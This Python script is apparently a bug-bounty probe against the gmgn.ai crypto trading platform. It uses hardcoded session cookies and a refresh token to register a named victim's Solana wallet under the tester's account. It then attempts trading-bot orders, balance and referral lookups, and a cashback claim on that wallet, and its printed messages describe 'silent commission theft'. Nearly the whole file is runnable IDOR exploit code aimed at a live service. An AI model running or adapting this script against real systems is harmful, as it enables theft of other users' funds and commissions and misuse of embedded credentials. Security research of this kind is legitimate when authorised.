#!/usr/bin/env python3
"""
USER_ID PIVOT TEST

Theory: If register_wallet links victim wallet to OUR user_id,
maybe there are endpoints that lookup by user_id instead of wallet ownership.

For example:
- Get all wallets for user_id → might include victim wallet
- Get wallet balance by user_id → might include victim balance
- Trading bot endpoints → might accept victim wallet if it's "under" our user_id
"""
import json
import requests

COOKIES = {
    '_ga_UGLVBMV4Z0': 'GS1.2.1784147274019075.6b09445dc224ac4ed190f0fc17562c09.%2BWBECXoGBNBcg0Fo8XQ6Zw%3D%3D.MgwbCP7e6%2F%2Fgxg46Zi4hxw%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.lf0gy6vV0UZfM%2Buod%2FYChA%3D%3D',
    '__cf_bm': 'BiwqYrKdqGkcrH0ZLK9f_OKFba2OCsbJ28phLs8iDi0-1784147278.2017257-1.0.1.1-nFEvU2MgsYGgu6HECjXk37MIl.qPDHnGC9TNy4X5mLQ_hqdjAngW69Qng5QVjwhaQkvk8bzJQDDqab54zo2xpYk0LzVwc4rsuc8AaEkVbHhs1LgUDKxdYJRDqJicqnnR',
    'g_state': '{"i_l":1,"i_ll":1784064572835,"i_e":{"enable_itp_optimization":24},"i_et":1784064572835,"i_b":"ZKMAELdKKMvOaL6Er88DW7w1hSd2zpaA4oygW8X+Lo4"}',
    '_ga_0XM0LYXGC8': 'GS2.1.s1784146779$o42$g1$t1784147281$j50$l0$h0',
    '_ga': 'GA1.1.1499118900.1783283677',
    '_csrf': 'L6Giyxap0kezMoy_ZZVuEuos0BMQCWu2',
    '_did': 'c800ab0b7d01aa37bc93aacdcbce271e',
    '_wt': 'AWpf5OQ6yKhuZEDm40uECgKO0pTyVxTLhc8Ds-Q',
    'sid': 'gmgn%7Ca04bda1a723a8218b4953962ef8e9169'
}

REFRESH_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNC0yMTE5LWM5MTMxNDEiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NjU2NjEyLCJpYXQiOjE3ODQwNjQ2MTIsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTk0NzA5OTctZmQxMC00YmE2LWEyYTAtMzExODUwNTNhMTM2IiwibmJmIjoxNzg0MDY0NjEyLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.H47Vj56YK1CYK08BpclIOKLFrootpc9Aud5BYkADA4GulAD2uaSEtwA5JYUG2Pj_PQak431Fk47_Q2R9rt4CSg"

VICTIM_SOL = "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"
OUR_SOL = "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8"

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260714-2119-c913141",
    "from_app": "gmgn",
    "app_ver": "20260714-2119-c913141"
}

print("="*80)
print("🔥 USER_ID PIVOT TEST")
print("="*80)
print("Theory: After register_wallet, victim is 'under' our user_id")
print("Maybe trading bot / balance / wallet management endpoints trust this")
print("="*80)

# Refresh token
r = requests.post(
    "https://gmgn.ai/account/account/refresh_access_token",
    params=PARAMS,
    headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    cookies=COOKIES,
    json={"refresh_token": REFRESH_TOKEN},
    timeout=10
)

if r.status_code != 200 or r.json().get('code') != 0:
    print(f"Token refresh failed")
    exit(1)

ACCESS_TOKEN = r.json()['data']['data']['token']
print(f"✅ Token refreshed\n")

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

# Step 1: Register wallet
print("[STEP 1] Register victim wallet")
r = requests.post(
    "https://gmgn.ai/defi/quotation/v1/register_wallet",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "chain": "sol",
        "address": VICTIM_SOL,
        "user_id": OUR_USER_ID
    },
    timeout=10
)
print(f"Status: {r.status_code}\n")

# Step 2: Try trading bot endpoints with victim wallet
print("="*80)
print("[STEP 2] Test Trading Bot with Victim Wallet")
print("="*80)
print("If victim is 'under' our user_id, maybe we can create orders for it")

test_cases = [
    {
        "name": "Create DCA Order",
        "endpoint": "https://gmgn.ai/tapi/v1/trading_bot/dca_order/create",
        "payload": {
            "wallet_address": VICTIM_SOL,
            "chain": "sol",
            "token_address": "So11111111111111111111111111111111111111112",
            "amount": "1000"
        }
    },
    {
        "name": "List Strategy Orders",
        "endpoint": "https://gmgn.ai/tapi/v1/trading_bot/strategy_order/open_list",
        "payload": {
            "wallet_address": VICTIM_SOL,
            "chain": "sol"
        }
    },
    {
        "name": "Get Wallet Balance",
        "endpoint": "https://gmgn.ai/rebate/api/v1/wallet/amount_sol",
        "payload": {
            "address": VICTIM_SOL
        }
    }
]

for test in test_cases:
    print(f"\n--- {test['name']} ---")
    print(f"Endpoint: {test['endpoint']}")
    print(f"Payload: {test['payload']}")
    
    r = requests.post(
        test['endpoint'],
        headers=HEADERS,
        cookies=COOKIES,
        params=PARAMS,
        json=test['payload'],
        timeout=10
    )
    
    print(f"Status: {r.status_code}")
    
    if r.status_code == 404:
        print("404 - Endpoint not found")
        continue
    
    try:
        resp = r.json()
    except:
        print(f"Non-JSON response: {r.text[:200]}")
        continue
    
    print(f"Response: {json.dumps(resp, indent=2)[:400]}")
    
    if resp.get('code') == 0:
        print(f"💀💀💀 {test['name']} WORKED!")
        print(f"Full response: {json.dumps(resp, indent=2)}")
    elif 'not self' in resp.get('message', '').lower():
        print("❌ Ownership validated")
    elif 'not found' in resp.get('message', '').lower():
        print("Wallet not in system")
    else:
        print(f"Error: {resp.get('message', 'Unknown')}")

# Step 3: Check referral/invite endpoints
print("\n" + "="*80)
print("[STEP 3] Check Referral/Invite Data After Registration")
print("="*80)

invite_endpoints = [
    {
        "name": "Get Invitation Info List",
        "endpoint": "https://gmgn.ai/defi/quotation/v1/invite/get_user_invitation_info_list",
        "method": "GET",
        "params_extra": {}
    },
    {
        "name": "Get Wallet Invitation List",
        "endpoint": "https://gmgn.ai/defi/quotation/v1/invite/get_tg_wallet_invitation_info_list",
        "method": "GET",
        "params_extra": {}
    },
    {
        "name": "Get User Token Rebate List",
        "endpoint": "https://gmgn.ai/defi/quotation/v1/rebate/get_user_token_rebate_list",
        "method": "GET",
        "params_extra": {"chain": "sol"}
    }
]

for test in invite_endpoints:
    print(f"\n--- {test['name']} ---")
    
    if test['method'] == 'GET':
        r = requests.get(
            test['endpoint'],
            headers=HEADERS,
            cookies=COOKIES,
            params={**PARAMS, **test['params_extra']},
            timeout=10
        )
    else:
        r = requests.post(
            test['endpoint'],
            headers=HEADERS,
            cookies=COOKIES,
            params=PARAMS,
            json=test.get('payload', {}),
            timeout=10
        )
    
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        resp = r.json()
        print(f"Response: {json.dumps(resp, indent=2)[:600]}")
        
        # Look for victim wallet in response
        resp_str = json.dumps(resp).lower()
        if VICTIM_SOL.lower() in resp_str:
            print(f"\n💀💀💀 VICTIM WALLET FOUND IN RESPONSE!")
            print("register_wallet successfully linked victim to our referral tree")

print("\n" + "="*80)
print("FINAL TEST: Can we claim victim's future cashback?")
print("="*80)

# This should work based on previous findings
r = requests.post(
    "https://gmgn.ai/rebate/api/v1/cashback/claim/apply",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "chain": "sol",
        "address": VICTIM_SOL
    },
    timeout=10
)

print(f"Status: {r.status_code}")
resp = r.json()
print(f"Response: {json.dumps(resp, indent=2)}")

if resp.get('code') == 0:
    status_code = resp.get('data', {}).get('status_code')
    if status_code == 'CB5003':
        print("\n✅ CASHBACK CLAIM IDOR CONFIRMED")
        print("We can claim victim's cashback (currently $0)")
        print("This is HIGH severity - silent commission theft")
    else:
        print(f"\n💀💀💀 CASHBACK CLAIMED! Status: {status_code}")

print("\n" + "="*80)
print("SUMMARY")
print("="*80)
print("register_wallet links victim to our referral tree")
print("We get their commissions/cashback but NOT wallet control")
print("This is still HIGH ($35k-$50k) but not CRITICAL ($75k+)")
